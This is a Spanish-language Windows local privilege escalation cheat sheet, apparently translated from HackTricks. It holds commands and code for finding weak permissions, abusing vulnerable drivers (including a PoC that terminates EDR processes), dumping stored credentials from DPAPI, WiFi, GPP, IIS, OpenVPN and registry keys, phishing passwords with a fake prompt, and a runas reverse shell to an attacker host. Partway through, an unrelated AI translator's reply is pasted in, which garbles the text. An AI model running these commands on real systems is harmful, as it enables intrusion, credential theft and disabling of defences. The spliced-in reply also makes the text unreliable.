Una forma de encontrar permisos débiles en carpetas/archivos del sistema es haciendo:
```bash
accesschk.exe /accepteula
# Find all weak folder permissions per drive.
accesschk.exe -uwdqs Users c:\
accesschk.exe -uwdqs "Authenticated Users" c:\
accesschk.exe -uwdqs "Everyone" c:\
# Find all weak file permissions per drive.
accesschk.exe -uwqs Users c:\*.*
accesschk.exe -uwqs "Authenticated Users" c:\*.*
accesschk.exe -uwdqs "Everyone" c:\*.*
```

```bash
icacls "C:\Program Files\*" 2>nul | findstr "(F) (M) :\" | findstr ":\ everyone authenticated users todos %username%"
icacls ":\Program Files (x86)\*" 2>nul | findstr "(F) (M) C:\" | findstr ":\ everyone authenticated users todos %username%"
```

```bash
Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'Everyone'} } catch {}}

Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'BUILTIN\Users'} } catch {}}
```
### Notepad++ plugin autoload persistence/execution

Notepad++ carga automáticamente cualquier plugin DLL dentro de sus subcarpetas `plugins`. Si existe una instalación portable/copy escribible, dejar un plugin malicioso proporciona ejecución automática de código dentro de `notepad++.exe` en cada lanzamiento (incluyendo desde `DllMain` y plugin callbacks).

{{#ref}}
notepad-plus-plus-plugin-autoload-persistence.md
{{#endref}}

### Ejecutar al inicio

**Comprueba si puedes sobrescribir algún registry o binary que vaya a ser ejecutado por un usuario diferente.**\
**Lee** la **siguiente página** para aprender más sobre ubicaciones interesantes de **autoruns locations to escalate privileges**:


{{#ref}}
privilege-escalation-with-autorun-binaries.md
{{#endref}}

### Drivers

Busca posibles **third party weird/vulnerable** drivers
```bash
driverquery
driverquery.exe /fo table
driverquery /SI
```
Si un driver expone una primitiva de lectura/escritura arbitraria del kernel (común en manejadores IOCTL mal diseñados), puedes escalar robando un token SYSTEM directamente de la memoria del kernel. Ve la técnica paso a paso aquí:

{{#ref}}
arbitrary-kernel-rw-token-theft.md
{{#endref}}

Para bugs de race-condition donde la llamada vulnerable abre una ruta del Object Manager controlada por el atacante, ralentizar deliberadamente la búsqueda (usando componentes de longitud máxima o cadenas de directorios profundas) puede ampliar la ventana de microsegundos a decenas de microsegundos:

{{#ref}}
kernel-race-condition-object-manager-slowdown.md
{{#endref}}

#### Registry hive memory corruption primitives

Las vulnerabilidades modernas de hive te permiten preparar layouts deterministas, abusar de descendants de HKLM/HKU escribibles y convertir la corrupción de metadata en overflows del kernel paged-pool sin un driver personalizado. Aprende la cadena completa aquí:

{{#ref}}
windows-registry-hive-exploitation.md
{{#endref}}

#### Abusing missing FILE_DEVICE_SECURE_OPEN on device objects (LPE + EDR kill)

Algunos drivers de terceros firmados crean su device object con un SDDL fuerte vía IoCreateDeviceSecure pero olvidan establecer FILE_DEVICE_SECURE_OPEN en DeviceCharacteristics. Sin este flag, el DACL seguro no se aplica cuando el device se abre mediante una ruta que contiene un componente extra, permitiendo a cualquier usuario no privilegiado obtener un handle usando una ruta de namespace como:

- \\ .\\DeviceName\\anything
- \\ .\\amsdk\\anyfile (from a real-world case)

Una vez que un usuario puede abrir el device, IOCTLs privilegiados expuestos por el driver pueden abusarse para LPE y manipulación. Capacidades observadas en el mundo real:
- Devolver handles con acceso total a procesos arbitrarios (token theft / SYSTEM shell vía DuplicateTokenEx/CreateProcessAsUser).
- Lectura/escritura raw de disco sin restricciones (offline tampering, trucos de persistencia en el arranque).
- Terminar procesos arbitrarios, incluyendo Protected Process/Light (PP/PPL), permitiendo AV/EDR kill desde user land vía kernel.

Minimal PoC pattern (user mode):
```c
// Example based on a vulnerable antimalware driver
#define IOCTL_REGISTER_PROCESS  0x80002010
#define IOCTL_TERMINATE_PROCESS 0x80002048

HANDLE h = CreateFileA("\\\\.\\amsdk\\anyfile", GENERIC_READ|GENERIC_WRITE, 0, 0, OPEN_EXISTING, 0, 0);
DWORD me = GetCurrentProcessId();
DWORD target = /* PID to kill or open */;
DeviceIoControl(h, IOCTL_REGISTER_PROCESS,  &me,     sizeof(me),     0, 0, 0, 0);
DeviceIoControl(h, IOCTL_TERMINATE_PROCESS, &target, sizeof(target), 0, 0, 0, 0);
```
Mitigaciones para desarrolladores
- Siempre establece FILE_DEVICE_SECURE_OPEN al crear device objects destinados a estar restringidos por una DACL.
- Valida el contexto del llamador para operaciones privilegiadas. Añade comprobaciones PP/PPL antes de permitir la terminación de procesos o la devolución de handles.
- Restringe los IOCTLs (access masks, METHOD_*, validación de entrada) y considera brokered models en lugar de privilegios directos del kernel.

Detection ideas for defenders
- Monitorea user-mode opens de nombres de dispositivo sospechosos (e.g., \\ .\\amsdk*) y secuencias específicas de IOCTL indicativas de abuso.
- Aplica la vulnerable driver blocklist de Microsoft (HVCI/WDAC/Smart App Control) y mantén tus propias listas de permitidos/denegados.


## PATH DLL Hijacking

If you have **write permissions inside a folder present on PATH** you could be able to hijack a DLL loaded by a process and **escalate privileges**.

Check permissions of all folders inside PATH:
```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```
Para más información sobre cómo abusar de esta comprobación:

{{#ref}}
dll-hijacking/writable-sys-path-dll-hijacking-privesc.md
{{#endref}}

## Red

### Recursos compartidos
```bash
net view #Get a list of computers
net view /all /domain [domainname] #Shares on the domains
net view \\computer /ALL #List shares of a computer
net use x: \\computer\share #Mount the share locally
net share #Check current shares
```
### hosts file

Comprobar si hay otros equipos conocidos hardcoded en el hosts file
```
type C:\Windows\System32\drivers\etc\hosts
```
### Interfaces de red y DNS
```
ipconfig /all
Get-NetIPConfiguration | ft InterfaceAlias,InterfaceDescription,IPv4Address
Get-DnsClientServerAddress -AddressFamily IPv4 | ft
```
### Puertos abiertos

Comprueba si hay servicios **restringidos** accesibles desde el exterior
```bash
netstat -ano #Opened ports?
```
### Tabla de enrutamiento
```
route print
Get-NetRoute -AddressFamily IPv4 | ft DestinationPrefix,NextHop,RouteMetric,ifIndex
```
### Tabla ARP
```
arp -A
Get-NetNeighbor -AddressFamily IPv4 | ft ifIndex,IPAddress,L
```
### Reglas de Firewall

[**Consulta esta página para comandos relacionados con Firewall**](../basic-cmd-for-pentesters.md#firewall) **(listar reglas, crear reglas, desactivar, desactivar...)**

Más[ comandos para la enumeración de red aquí](../basic-cmd-for-pentesters.md#network)

### Subsistema de Windows para Linux (wsl)
```bash
C:\Windows\System32\bash.exe
C:\Windows\System32\wsl.exe
```
El binario `bash.exe` también se puede encontrar en `C:\Windows\WinSxS\amd64_microsoft-windows-lxssbash_[...]\bash.exe`

Si obtienes root user puedes escuchar en cualquier puerto (la primera vez que uses `nc.exe` para escuchar en un puerto te preguntará vía GUI si `nc` debe ser permitido por el firewall).
```bash
wsl whoami
./ubuntun1604.exe config --default-user root
wsl whoami
wsl python -c 'BIND_OR_REVERSE_SHELL_PYTHON_CODE'
```
Para iniciar bash como root fácilmente, puedes probar `--default-user root`

Puedes explorar el sistema de archivos de `WSL` en la carpeta `C:\Users\%USERNAME%\AppData\Local\Packages\CanonicalGroupLimited.UbuntuonWindows_79rhkp1fndgsc\LocalState\rootfs\`

## Credenciales de Windows

### Credenciales de Winlogon
```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr /i "DefaultDomainName DefaultUserName DefaultPassword AltDefaultDomainName AltDefaultUserName AltDefaultPassword LastUsedUsername"

#Other way
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultPassword
```
### Administrador de credenciales / Windows vault

De [https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault]\  
El Windows Vault almacena credenciales de usuario para servidores, sitios web y otros programas con los que **Windows** puede **iniciar sesión automáticamente en nombre de los usuarios**. A primera vista, esto podría parecer que los usuarios pueden almacenar sus credenciales de Facebook, Twitter, Gmail, etc., para iniciar sesión automáticamente desde los navegadores. Pero no es así.

Windows Vault almacena credenciales que Windows puede usar para iniciar sesión automáticamente en nombre de los usuarios, lo que significa que cualquier **aplicación de Windows que necesite credenciales para acceder a un recurso** (servidor o sitio web) **puede hacer uso de este Credential Manager** & Windows Vault y usar las credenciales proporcionadas en lugar de que los usuarios introduzcan el nombre de usuario y la contraseña cada vez.

A menos que las aplicaciones interactúen con Credential Manager, no creo que sea posible que utilicen las credenciales para un recurso dado. Por lo tanto, si tu aplicación quiere hacer uso del vault, debería de alguna manera **comunicarse con el Credential Manager y solicitar las credenciales para ese recurso** desde el vault de almacenamiento predeterminado.

Usa `cmdkey` para listar las credenciales almacenadas en la máquina.
```bash
cmdkey /list
Currently stored credentials:
Target: Domain:interactive=WORKGROUP\Administrator
Type: Domain Password
User: WORKGROUP\Administrator
```
Entonces puedes usar `runas` con la opción `/savecred` para usar las credenciales guardadas. El siguiente ejemplo invoca un binario remoto a través de un SMB share.
```bash
runas /savecred /user:WORKGROUP\Administrator "\\10.XXX.XXX.XXX\SHARE\evil.exe"
```
Uso de `runas` con un conjunto de credenciales proporcionadas.
```bash
C:\Windows\System32\runas.exe /env /noprofile /user:<username> <password> "c:\users\Public\nc.exe -nc <attacker-ip> 4444 -e cmd.exe"
```
Tenga en cuenta que mimikatz, lazagne, [credentialfileview](https://www.nirsoft.net/utils/credentials_file_view.html), [VaultPasswordView](https://www.nirsoft.net/utils/vault_password_view.html), o el módulo de PowerShell de [Empire Powershells module](https://github.com/EmpireProject/Empire/blob/master/data/module_source/credentials/dumpCredStore.ps1).

### DPAPI

La **Data Protection API (DPAPI)** proporciona un método para el cifrado simétrico de datos, utilizado predominantemente en el sistema operativo Windows para el cifrado simétrico de claves privadas asimétricas. Este cifrado aprovecha un secreto de usuario o del sistema para contribuir significativamente a la entropía.

**DPAPI permite el cifrado de claves mediante una clave simétrica que se deriva de los secretos de inicio de sesión del usuario**. En escenarios que implican cifrado del sistema, utiliza los secretos de autenticación de dominio del sistema.

Las claves RSA de usuario cifradas, al usar DPAPI, se almacenan en el directorio `%APPDATA%\Microsoft\Protect\{SID}`, donde `{SID}` representa el [Security Identifier](https://en.wikipedia.org/wiki/Security_Identifier) del usuario. **La clave DPAPI, co-ubicada con la clave maestra que protege las claves privadas del usuario en el mismo archivo**, normalmente consiste en 64 bytes de datos aleatorios. (Es importante notar que el acceso a este directorio está restringido, impidiendo listar su contenido mediante el comando `dir` en CMD, aunque puede listarse mediante PowerShell).
```bash
Get-ChildItem  C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem  C:\Users\USER\AppData\Local\Microsoft\Protect\
```
Puedes usar el **mimikatz module** `dpapi::masterkey` con los argumentos apropiados (`/pvk` o `/rpc`) para descifrarlo.

Los **archivos de credenciales protegidos por la contraseña maestra** suelen estar ubicados en:
```bash
dir C:\Users\username\AppData\Local\Microsoft\Credentials\
dir C:\Users\username\AppData\Roaming\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```
Puedes usar el **mimikatz module** `dpapi::cred` con el `/masterkey` apropiado para descifrar.\
Puedes **extraer muchos DPAPI** **masterkeys** de la **memory** con el módulo `sekurlsa::dpapi` (si eres root).


{{#ref}}
dpapi-extracting-passwords.md
{{#endref}}

### Credenciales de PowerShell

Las **Credenciales de PowerShell** se usan a menudo para tareas de **scripting** y automatización como una forma conveniente de almacenar credenciales cifradas. Las credenciales están protegidas usando **DPAPI**, lo que normalmente significa que solo pueden ser descifradas por el mismo usuario en el mismo equipo en el que fueron creadas.

Para **descifrar** credenciales de PS desde el archivo que las contiene, puedes hacer:
```bash
PS C:\> $credential = Import-Clixml -Path 'C:\pass.xml'
PS C:\> $credential.GetNetworkCredential().username

john

PS C:\htb> $credential.GetNetworkCredential().password

JustAPWD!
```
### Wifi
```bash
#List saved Wifi using
netsh wlan show profile
#To get the clear-text password use
netsh wlan show profile <SSID> key=clear
#Oneliner to extract all wifi passwords
cls & echo. & for /f "tokens=3,* delims=: " %a in ('netsh wlan show profiles ^| find "Profile "') do @echo off > nul & (netsh wlan show profiles name="%b" key=clear | findstr "SSID Cipher Content" | find /v "Number" & echo.) & @echo on*
```
### Conexiones RDP guardadas

Puedes encontrarlas en `HKEY_USERS\<SID>\Software\Microsoft\Terminal Server Client\Servers\`\
y en `HKCU\Software\Microsoft\Terminal Server Client\Servers\`

### Comandos ejecutados recientemente
```
HCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
HKCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
```
### **Administrador de credenciales de Escritorio remoto**
```
%localappdata%\Microsoft\Remote Desktop Connection Manager\RDCMan.settings
```
Usa el **Mimikatz** `dpapi::rdg` module con el `/masterkey` apropiado para **descifrar cualquier archivo .rdg**\
Puedes **extraer muchos DPAPI masterkeys** de la memoria con el módulo Mimikatz `sekurlsa::dpapi` module

### Sticky Notes

Las personas suelen usar la aplicación StickyNotes en estaciones de trabajo Windows para **save passwords** y otra información, sin darse cuenta de que es un archivo de base de datos. Este archivo se encuentra en `C:\Users\<user>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite` y siempre vale la pena buscarlo y examinarlo.

### AppCmd.exe

**Tenga en cuenta que para recover passwords desde AppCmd.exe necesita ser Administrator y ejecutarlo bajo un High Integrity level.**\
**AppCmd.exe** se encuentra en el directorio `%systemroot%\system32\inetsrv\`.\  
Si este archivo existe entonces es posible que se hayan configurado algunas **credentials** y que puedan ser **recovered**.

Este código fue extraído de [**PowerUP**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1):
```bash
function Get-ApplicationHost {
$OrigError = $ErrorActionPreference
$ErrorActionPreference = "SilentlyContinue"

# Check if appcmd.exe exists
if (Test-Path  ("$Env:SystemRoot\System32\inetsrv\appcmd.exe")) {
# Create data table to house results
$DataTable = New-Object System.Data.DataTable

# Create and name columns in the data table
$Null = $DataTable.Columns.Add("user")
$Null = $DataTable.Columns.Add("pass")
$Null = $DataTable.Columns.Add("type")
$Null = $DataTable.Columns.Add("vdir")
$Null = $DataTable.Columns.Add("apppool")

# Get list of application pools
Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppools /text:name" | ForEach-Object {

# Get application pool name
$PoolName = $_

# Get username
$PoolUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.username"
$PoolUser = Invoke-Expression $PoolUserCmd

# Get password
$PoolPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.password"
$PoolPassword = Invoke-Expression $PoolPasswordCmd

# Check if credentials exists
if (($PoolPassword -ne "") -and ($PoolPassword -isnot [system.array])) {
# Add credentials to database
$Null = $DataTable.Rows.Add($PoolUser, $PoolPassword,'Application Pool','NA',$PoolName)
}
}

# Get list of virtual directories
Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir /text:vdir.name" | ForEach-Object {

# Get Virtual Directory Name
$VdirName = $_

# Get username
$VdirUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:userName"
$VdirUser = Invoke-Expression $VdirUserCmd

# Get password
$VdirPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:password"
$VdirPassword = Invoke-Expression $VdirPasswordCmd

# Check if credentials exists
if (($VdirPassword -ne "") -and ($VdirPassword -isnot [system.array])) {
# Add credentials to database
$Null = $DataTable.Rows.Add($VdirUser, $VdirPassword,'Virtual Directory',$VdirName,'NA')
}
}

# Check if any passwords were found
if( $DataTable.rows.Count -gt 0 ) {
# Display results in list view that can feed into the pipeline
$DataTable |  Sort-Object type,user,pass,vdir,apppool | Select-Object user,pass,type,vdir,apppool -Unique
}
else {
# Status user
Write-Verbose 'No application pool or virtual directory passwords were found.'
$False
}
}
else {
Write-Verbose 'Appcmd.exe does not exist in the default location.'
$False
}
$ErrorActionPreference = $OrigError
}
```
### SCClient / SCCM

Comprueba si `C:\Windows\CCM\SCClient.exe` existe .\
Los instaladores se **ejecutan con privilegios de SYSTEM**, muchos son vulnerables a **DLL Sideloading (Información de** [**https://github.com/enjoiz/Privesc**](https://github.com/enjoiz/Privesc)**).**
```bash
$result = Get-WmiObject -Namespace "root\ccm\clientSDK" -Class CCM_Application -Property * | select Name,SoftwareVersion
if ($result) { $result }
else { Write "Not Installed." }
```
## Archivos y Registro (Credenciales)

### Putty Creds
```bash
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s | findstr "HKEY_CURRENT_USER HostName PortNumber UserName PublicKeyFile PortForwardings ConnectionSharing ProxyPassword ProxyUsername" #Check the values saved in each session, user/password could be there
```
### Putty SSH Claves de host
```
reg query HKCU\Software\SimonTatham\PuTTY\SshHostKeys\
```
### Claves SSH en el registro

Las claves privadas SSH pueden almacenarse dentro de la clave del registro `HKCU\Software\OpenSSH\Agent\Keys`, por lo que deberías comprobar si hay algo interesante allí:
```bash
reg query 'HKEY_CURRENT_USER\Software\OpenSSH\Agent\Keys'
```
Si encuentras alguna entrada dentro de esa ruta, probablemente será una clave SSH guardada. Está almacenada cifrada pero puede descifrarse fácilmente usando [https://github.com/ropnop/windows_sshagent_extract](https://github.com/ropnop/windows_sshagent_extract).\
Más información sobre esta técnica aquí: [https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

Si el servicio `ssh-agent` no está en ejecución y quieres que se inicie automáticamente al arrancar, ejecuta:
```bash
Get-Service ssh-agent | Set-Service -StartupType Automatic -PassThru | Start-Service
```
> [!TIP]
> Parece que esta técnica ya no es válida. Intenté crear algunas claves ssh, añadirlas con `ssh-add` e iniciar sesión vía ssh en una máquina. El registro HKCU\Software\OpenSSH\Agent\Keys no existe y procmon no identificó el uso de `dpapi.dll` durante la autenticación de clave asimétrica.

### Archivos desatendidos
```
C:\Windows\sysprep\sysprep.xml
C:\Windows\sysprep\sysprep.inf
C:\Windows\sysprep.inf
C:\Windows\Panther\Unattended.xml
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattend\Unattend.xml
C:\Windows\Panther\Unattend\Unattended.xml
C:\Windows\System32\Sysprep\unattend.xml
C:\Windows\System32\Sysprep\unattended.xml
C:\unattend.txt
C:\unattend.inf
dir /s *sysprep.inf *sysprep.xml *unattended.xml *unattend.xml *unattend.txt 2>nul
```
También puedes buscar estos archivos usando **metasploit**: _post/windows/gather/enum_unattend_

Ejemplo de contenido:
```xml
<component name="Microsoft-Windows-Shell-Setup" publicKeyToken="31bf3856ad364e35" language="neutral" versionScope="nonSxS" processorArchitecture="amd64">
<AutoLogon>
<Password>U2VjcmV0U2VjdXJlUGFzc3dvcmQxMjM0Kgo==</Password>
<Enabled>true</Enabled>
<Username>Administrateur</Username>
</AutoLogon>

<UserAccounts>
<LocalAccounts>
<LocalAccount wcm:action="add">
<Password>*SENSITIVE*DATA*DELETED*</Password>
<Group>administrators;users</Group>
<Name>Administrateur</Name>
</LocalAccount>
</LocalAccounts>
</UserAccounts>
```
### Copias de seguridad de SAM & SYSTEM
```bash
# Usually %SYSTEMROOT% = C:\Windows
%SYSTEMROOT%\repair\SAM
%SYSTEMROOT%\System32\config\RegBack\SAM
%SYSTEMROOT%\System32\config\SAM
%SYSTEMROOT%\repair\system
%SYSTEMROOT%\System32\config\SYSTEM
%SYSTEMROOT%\System32\config\RegBack\system
```
### Credenciales de la nube
```bash
#From user home
.aws\credentials
AppData\Roaming\gcloud\credentials.db
AppData\Roaming\gcloud\legacy_credentials
AppData\Roaming\gcloud\access_tokens.db
.azure\accessTokens.json
.azure\azureProfile.json
```
### McAfee SiteList.xml

Busca un archivo llamado **SiteList.xml**

### Contraseña GPP en caché

Anteriormente existía una característica que permitía desplegar cuentas de administrador local personalizadas en un conjunto de máquinas mediante Group Policy Preferences (GPP). Sin embargo, este método tenía fallas de seguridad significativas. En primer lugar, los Group Policy Objects (GPOs), almacenados como archivos XML en SYSVOL, podían ser accedidos por cualquier usuario de dominio. En segundo lugar, las contraseñas dentro de estos GPPs, cifradas con AES256 usando una clave predeterminada publicada públicamente, podían ser descifradas por cualquier usuario autenticado. Esto suponía un riesgo serio, ya que podría permitir a usuarios obtener privilegios elevados.

Para mitigar este riesgo, se desarrolló una función para escanear archivos GPP almacenados en caché localmente que contengan un campo "cpassword" que no esté vacío. Al encontrar dicho archivo, la función descifra la contraseña y devuelve un objeto PowerShell personalizado. Este objeto incluye detalles sobre el GPP y la ubicación del archivo, ayudando en la identificación y remediación de esta vulnerabilidad de seguridad.

Search in `C:\ProgramData\Microsoft\Group Policy\history` or in _**C:\Documents and Settings\All Users\Application Data\Microsoft\Group Policy\history** (anterior a W Vista)_ for these files:

- Groups.xml
- Services.xml
- Scheduledtasks.xml
- DataSources.xml
- Printers.xml
- Drives.xml

**Para descifrar el cPassword:**
```bash
#To decrypt these passwords you can decrypt it using
gpp-decrypt j1Uyj3Vx8TY9LtLZil2uAuZkFQA/4latT76ZwgdHdhw
```
Usando crackmapexec para obtener las contraseñas:
```bash
crackmapexec smb 10.10.10.10 -u username -p pwd -M gpp_autologin
```
### IIS Web Configuración
```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```

```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
C:\inetpub\wwwroot\web.config
```

```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
Get-Childitem –Path C:\xampp\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```
Ejemplo de web.config con credenciales:
```xml
<authentication mode="Forms">
<forms name="login" loginUrl="/admin">
<credentials passwordFormat = "Clear">
<user name="Administrator" password="SuperAdminPassword" />
</credentials>
</forms>
</authentication>
```
### Credenciales de OpenVPN
```csharp
Add-Type -AssemblyName System.Security
$keys = Get-ChildItem "HKCU:\Software\OpenVPN-GUI\configs"
$items = $keys | ForEach-Object {Get-ItemProperty $_.PsPath}

foreach ($item in $items)
{
$encryptedbytes=$item.'auth-data'
$entropy=$item.'entropy'
$entropy=$entropy[0..(($entropy.Length)-2)]

$decryptedbytes = [System.Security.Cryptography.ProtectedData]::Unprotect(
$encryptedBytes,
$entropy,
[System.Security.Cryptography.DataProtectionScope]::CurrentUser)

Write-Host ([System.Text.Encoding]::Unicode.GetString($decryptedbytes))
}
```
### Registros
```bash
# IIS
C:\inetpub\logs\LogFiles\*

#Apache
Get-Childitem –Path C:\ -Include access.log,error.log -File -Recurse -ErrorAction SilentlyContinue
```
### Pedir credenciales

Siempre puedes **pedir al usuario que introduzca sus credentials o incluso las credentials de otro usuario** si crees que las puede conocer (ten en cuenta que **pedir** al cliente directamente las **credentials** es realmente **arriesgado**):
```bash
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+[Environment]::UserName,[Environment]::UserDomainName); $cred.getnetworkcredential().password
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\\'+'anotherusername',[Environment]::UserDomainName); $cred.getnetworkcredential().password

#Get plaintext
$cred.GetNetworkCredential() | fl
```
### **Posibles nombres de archivo que contienen credentials**

Archivos conocidos que en algún momento contenían **passwords** en **clear-text** o **Base64**
```bash
$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history
vnc.ini, ultravnc.ini, *vnc*
web.config
php.ini httpd.conf httpd-xampp.conf my.ini my.cnf (XAMPP, Apache, PHP)
SiteList.xml #McAfee
ConsoleHost_history.txt #PS-History
*.gpg
*.pgp
*config*.php
elasticsearch.y*ml
kibana.y*ml
*.p12
*.der
*.csr
*.cer
known_hosts
id_rsa
id_dsa
*.ovpn
anaconda-ks.cfg
hostapd.conf
rsyncd.conf
cesi.conf
supervisord.conf
tomcat-users.xml
*.kdbx
KeePass.config
Ntds.dit
SAM
SYSTEM
FreeSSHDservice.ini
access.log
error.log
server.xml
ConsoleHost_history.txt
setupinfo
setupinfo.bak
key3.db         #Firefox
key4.db         #Firefox
places.sqlite   #Firefox
"Login Data"    #Chrome
Cookies         #Chrome
Bookmarks       #Chrome
History         #Chrome
TypedURLsTime   #IE
TypedURLs       #IE
%SYSTEMDRIVE%\pagefile.sys
%WINDIR%\debug\NetSetup.log
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software, %WINDIR%\repair\security
%WINDIR%\iis6.log
%WINDIR%\system32\config\AppEvent.Evt
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\CCM\logs\*.log
%USERPROFILE%\ntuser.dat
%USERPROFILE%\LocalS~1\Tempor~1\Content.IE5\index.dat
```
No tengo acceso directo a tu repositorio ni a archivos locales. Para traducir src/windows-hardening/windows-local-privilege-escalation/README.md necesito que pegues aquí el contenido del archivo o me des acceso al texto.

Opciones rápidas:
- Pega el contenido completo del README.md en tu siguiente mensaje.
- O ejecuta en tu máquina y pega el resultado:
  - cat src/windows-hardening/windows-local-privilege-escalation/README.md
  - git show HEAD:src/windows-hardening/windows-local-privilege-escalation/README.md

Cuando me des el contenido, lo traduciré al español respetando las reglas (no traducir código, nombres técnicos, links, paths, tags ni markdown).
```
cd C:\
dir /s/b /A:-D RDCMan.settings == *.rdg == *_history* == httpd.conf == .htpasswd == .gitconfig == .git-credentials == Dockerfile == docker-compose.yml == access_tokens.db == accessTokens.json == azureProfile.json == appcmd.exe == scclient.exe == *.gpg$ == *.pgp$ == *config*.php == elasticsearch.y*ml == kibana.y*ml == *.p12$ == *.cer$ == known_hosts == *id_rsa* == *id_dsa* == *.ovpn == tomcat-users.xml == web.config == *.kdbx == KeePass.config == Ntds.dit == SAM == SYSTEM == security == software == FreeSSHDservice.ini == sysprep.inf == sysprep.xml == *vnc*.ini == *vnc*.c*nf* == *vnc*.txt == *vnc*.xml == php.ini == https.conf == https-xampp.conf == my.ini == my.cnf == access.log == error.log == server.xml == ConsoleHost_history.txt == pagefile.sys == NetSetup.log == iis6.log == AppEvent.Evt == SecEvent.Evt == default.sav == security.sav == software.sav == system.sav == ntuser.dat == index.dat == bash.exe == wsl.exe 2>nul | findstr /v ".dll"
```

```
Get-Childitem –Path C:\ -Include *unattend*,*sysprep* -File -Recurse -ErrorAction SilentlyContinue | where {($_.Name -like "*.xml" -or $_.Name -like "*.txt" -or $_.Name -like "*.ini")}
```
### Credentials in the RecycleBin

También deberías comprobar el Bin para buscar credentials en su interior

Para **recover passwords** guardadas por varios programas puedes usar: [http://www.nirsoft.net/password_recovery_tools.html](http://www.nirsoft.net/password_recovery_tools.html)

### Inside the registry

**Otras posibles claves del registro con credentials**
```bash
reg query "HKCU\Software\ORL\WinVNC3\Password"
reg query "HKLM\SYSTEM\CurrentControlSet\Services\SNMP" /s
reg query "HKCU\Software\TightVNC\Server"
reg query "HKCU\Software\OpenSSH\Agent\Key"
```
[**Extract openssh keys from registry.**](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

### Historial de navegadores

Deberías comprobar las dbs donde se almacenan las passwords de **Chrome or Firefox**.\
También revisa el historial, los marcadores y favoritos de los navegadores, ya que quizá algunos **passwords are** estén almacenados allí.

Tools to extract passwords from browsers:

- Mimikatz: `dpapi::chrome`
- [**SharpWeb**](https://github.com/djhohnstein/SharpWeb)
- [**SharpChromium**](https://github.com/djhohnstein/SharpChromium)
- [**SharpDPAPI**](https://github.com/GhostPack/SharpDPAPI)

### **COM DLL Overwriting**

Component Object Model (COM) es una tecnología integrada en el sistema operativo Windows que permite la intercomunicación entre componentes de software escritos en distintos lenguajes. Cada componente COM se identifica mediante un class ID (CLSID) y cada componente expone funcionalidad a través de una o más interfaces, identificadas mediante interface IDs (IIDs).

Las clases e interfaces COM se definen en el registro bajo **HKEY\CLASSES\ROOT\CLSID** y **HKEY\CLASSES\ROOT\Interface** respectivamente. Este registro se crea al fusionar **HKEY\LOCAL\MACHINE\Software\Classes** + **HKEY\CURRENT\USER\Software\Classes** = **HKEY\CLASSES\ROOT.**

Inside the CLSIDs of this registry you can find the child registry **InProcServer32** which contains a **default value** pointing to a **DLL** and a value called **ThreadingModel** that can be **Apartment** (hilo único), **Free** (multihilo), **Both** (hilo único o multihilo) or **Neutral** (neutro respecto al hilo).

![](<../../images/image (729).png>)

Básicamente, si puedes sobrescribir cualquiera de las DLLs que se van a ejecutar, podrías escalate privileges si esa DLL va a ser ejecutada por un usuario distinto.

Para aprender cómo los atacantes usan COM Hijacking como mecanismo de persistencia, consulta:


{{#ref}}
com-hijacking.md
{{#endref}}

